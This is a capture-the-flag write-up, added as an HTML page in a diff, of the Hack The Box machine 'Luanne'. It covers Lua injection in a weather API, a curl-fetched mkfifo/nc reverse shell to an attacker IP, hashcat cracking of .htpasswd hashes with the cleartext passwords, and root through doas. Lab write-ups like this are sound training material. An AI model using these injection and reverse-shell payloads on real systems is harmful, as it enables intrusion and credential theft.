@@ -1,0 +1,207 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body>
+    <aside>
+        <iframe src="nav.html"></iframe>
+    </aside>
+
+    <aside class="index">
+        <h1>page index</h1>
+        <ol>
+            <li><a href="#information">Information</a></li>
+            <li><a href="#foothold">foothold</a></li>
+            <li><a href="#user">user</a></li>
+            <li><a href="#root">root</a></li>
+        </ol>
+    </aside>
+
+    <article>
+        <h1>Luanne</h1>
+        <section id="information">
+            <h2>1. Information</h2>
+            <ul>
+                <li> NetBSD</li>
+                <li> Easy class</li>
+                <li> Released Nov 2020</li>
+                <li> Retired Mar 2021</li>
+            </ul>
+            <p> Luanne is an easy-rated NetBSD machine featuring an exploitable Lua service and password cracking.</p>
+        </section>
+
+        <section id="foothold">
+            <h2>2. Foothold</h2>
+            <p><span>nmap -sC -sV -T4 -v luanne.htb</span> shows two open HTTP services and SSH. Both HTTP servers
+                have HTTP Basic authentication in place and return <span>401 Unauthorized</span>. It also shows that
+                the machine may be NetBSD.
+            </p>
+            <code>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey:
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+| http-robots.txt: 1 disallowed entry
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+            </code>
+            <p>
+                On port 80 however, <span>/robots.txt</span> has a comment hint: <span>Disallow: /weather #returning
+                    404 but still harvesting cities </span>. Accessing <span>/weather</span> returns 404 as
+                described, so let's fuzz it a bit.
+            </p>
+
+            <p>
+                A scan with <span>gobuster dir -u http://luanne.htb/weather -w
+                    /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt</span>
+                will give us a new path at <span>forecast</span> that exposes a JSON service. Following the
+                instructions and supplying the <span>GET</span> parameter <span>?city=list</span> will give us a
+                list of cities.
+            </p>
+
+            <img src="static/img/luanne_1.jpg" />
+            <figcaption>JSON API at <span>/weather/forecast</span></figcaption>
+
+            <p>
+                Fuzzing the <span>city</span> parameter a bit with <span>'</span> result in a Lua error:
+                <span><br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value</span>. We now
+                know there's a <span>weather.lua</span> file responding to our queries.
+                It seems that the parameter may be put inside a function call which could allow it to be escaped by
+                terminating the line in a payload. This is confirmed with a <span>city=Leeds');+print(2-2);
+                    --</span> which tries to search for a city named <span>Leeds0</span>. We have Lua RCE.
+            </p>
+
+            <p>Taking it further we can recon a bit with the <a href="https://www.lua.org/pil/22.2.html"
+                    </a><span>os.execute()</span></a> Lua function. <span>city=Leeds'); os.execute("ls -lah
+                    /bin"));</span>. Further recon confirms that both <span>curl</span> and <span>sh</span> binaries
+                are available.
+
+            </p>
+
+            <p>Getting urlencodes correctly when providing payloads may prove tricky -- let's try downloading a
+                reverse shell and executing it with <span>sh</span>. Create a file <span>echo "rm /tmp/f;mkfifo
+                    /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4444 >/tmp/f" > sh.sh</span> and start a
+                <span>python3 -m http.server</span>. Then after running <span>nc -lvnp 4444</span> send the following
+                payload to gain a shell:
+                <span>Leeds%27);%20os.execute("curl+10.10.14.41:8000/sh.sh+|sh");%20--</span>
+            </p>
+
+            <code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.129.126.48] 65406
+sh: can't access tty; job control turned off
+$ id
+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+                            </code>
+        </section>
+
+        <section id="user">
+            <h2>3. User</h2>
+            <p> <span>uname -a</span> will confirm that the machine is indeed NetBSD.</p>
+            <p>
+                First, <span>ls -lah</span> in the current directory will display a <span>.htpasswd</span> file with one
+                entry for <span>webapi_user</span>. This is likely to be the HTTP server credential, so let's crack it
+                with <span>./hashcat -m 500 '$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0' rockyou.txt</span>.
+            </p>
+            <code>
+    $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
+            </code>
+            <figcaption>The cracked hash</figcaption>
+            <p>
+                Looking at the processes that are running with <span>ps aux</span>, there's an internal server on port
+                3001 run by
+                <span>r.michaels</span>, the user on this system. <span>curl</span> without credentials will again fail
+                to <span>401 Unauthorized</span>, but trying with the <span>webapi_user</span> credentials will return
+                <span>200</span>.
+            </p>
+
+            <p>
+                Another useful clue is in the process flags. Looking online for <span>netbsd httpd man</span> will tell
+                us that the <span>-u</span> flag will host a user's <span>~/username/public_html</span> in the address
+                <span>http://ip/~username/</span>. <span>curl</span> confirms this in tells us that there's an
+                <span>id_rsa</span> file in the directory.
+            </p>
+
+            <p>We can exfiltrate this key to our attacking machine and try to log in with <span>ssh -i id_rsa
+                    r.michaels@luanne.htb</span>, which works. We can now grab the user key.</p>
+        </section>
+        <section id="root">
+            <h2>4. Root</h2>
+
+            <p>
+
+                Running <span>ls -lah</span> again gives us some useful directories.
+            </p>
+            <code>
+                luanne$ ls -lah
+total 7.6K
+dr-xr-x---  7 r.michaels  users  512B Sep 16  2020 .
+drwxr-xr-x  3 root        wheel  512B Sep 14  2020 ..
+-rw-r--r--  1 r.michaels  users  1.7K Feb 14  2020 .cshrc
+drwx------  2 r.michaels  users  512B Sep 14  2020 .gnupg
+-rw-r--r--  1 r.michaels  users  431B Feb 14  2020 .login
+-rw-r--r--  1 r.michaels  users  265B Feb 14  2020 .logout
+-rw-r--r--  1 r.michaels  users  1.5K Feb 14  2020 .profile
+-rw-r--r--  1 r.michaels  users  166B Feb 14  2020 .shrc
+dr-x------  2 r.michaels  users  512B Sep 16  2020 .ssh
+dr-xr-xr-x  2 r.michaels  users  512B Nov 24 09:26 backups
+dr-xr-x---  4 r.michaels  users  512B Sep 16  2020 devel
+dr-x------  2 r.michaels  users  512B Sep 16  2020 public_html
+-r--------  1 r.michaels  users   33B Sep 16  2020 user.txt
+            </code>
+        </section>
+
+        <p>The <span>backups</span> directory has a <span>devel_backup-2020-09-16.tar.gz.enc</span> file, which seems to
+            be an encrypted archive.</p>
+        <p>
+            The <span>.gpg</span> directory could hint that it was encrypted with
+            <span>pgp</span> and might contain the keys to reverse this. The NetBSD version of this is
+            <span>netpgp</span>, which can be used to decrypt the
+            archive.
+        </p>
+        <code>
+luanne$ netpgp --decrypt backups/devel_backup-2020-09-16.tar.gz.enc --output /tmp/bak.tar.gz
+signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
+uid              RSA 2048-bit key <r.michaels@localhost>
+luanne$ cd /tmp
+luanne$ tar xvf bak.tar.gz
+        </code>
+        <p>The archive is decompressed as <span>/tmp/devel-2020-09-16</span>, and inside we find another
+            <span>/tmp/devel-2020-09-16/www/.htpasswd</span> with a different hash. <span>hashcat -m 500
+                '$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' lists/rockyou.txt</span> cracks the password which is
+            <span>littlebear</span>.
+        </p>
+
+        <p>Since there are no other users, it may be <span>r.michaels</span> user's password and may be used to escalate
+            to superuser. On NetBSD the <span>sudo</span> equivalent is <span>doas</span>.</p>
+        <code>
+luanne$ doas -u root /bin/sh
+Password: littlebear
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
+            </code>
+
+        <p>After gaining root access we grab the flag.</p>
+    </article>
+</body>
+
+</html>
